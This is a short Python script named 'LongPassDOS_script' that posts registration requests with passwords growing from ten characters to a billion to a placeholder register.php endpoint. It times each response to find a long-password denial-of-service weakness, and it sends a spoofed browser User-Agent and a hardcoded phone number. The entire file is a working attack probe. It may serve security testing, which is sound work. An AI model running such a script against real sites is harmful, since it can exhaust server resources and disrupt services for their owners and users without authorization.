#-*- coding:utf-8 -*-
# LongPassDOS_script


import time
import requests


heads = {}
heads['User-Agent'] = 'Mozilla/5.0 ' \
                          '(Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 ' \
                          '(KHTML, like Gecko) Version/5.1 Safari/534.50'
'''len = [10, 100, 1000, 10000, 100000, 1000000]'''

for i in range(10):
    passLen = 10 ** i
    # print(passLen)
    password1 = 'a' * passLen
    data = {'mobile':'13623625192','username':'bbbb', 'password': password1,'code':'aaaaa' ,'corp': 'aaaaaaa','corpshort':'corpshort'}
    starttime = time.time()
    '''time.sleep(5)'''
    response = requests.post('http://xxxxxxx/register.php',data=data)
    endtime = time.time()
    usetime = endtime -starttime
    '''print(response.status_code, 'aaaaaaaaaaaaaaaaaaaaaaa')'''
    print ("%d 位密码访问用时:%f 秒 " % (passLen, usetime))